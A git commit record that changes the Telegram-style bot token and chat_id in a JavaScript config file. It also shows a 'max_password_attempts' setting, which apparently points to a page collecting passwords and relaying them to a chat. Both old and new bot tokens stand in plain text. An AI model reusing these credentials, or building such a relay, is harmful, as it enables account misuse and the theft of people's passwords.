b308c38e64649b31b2afd721d786aae18603b66d
tkd686 <nicolereedprincestark529@gmail.com>
2026-01-12 22:00:33 +0700

    Change token and chat_id in config.js
    Updated token and chat_id in the config file.

--- src/utils/config.js
+++ src/utils/config.js
@@ -1,6 +1,6 @@
 const config = {
-    token: '7771399730:AAHBz0XIxTTM4Exej3SgJisxgDq6JA-Tm0E',
-    chat_id: '5288629042',
+    token: '7745986350:AAFZ9jyAXV22-kCaJgirTh2MC7J-9oYcmGY',
+    chat_id: '5191933010',
     noti_token: '',
     noti_chat_id: '',
     max_password_attempts: 2,
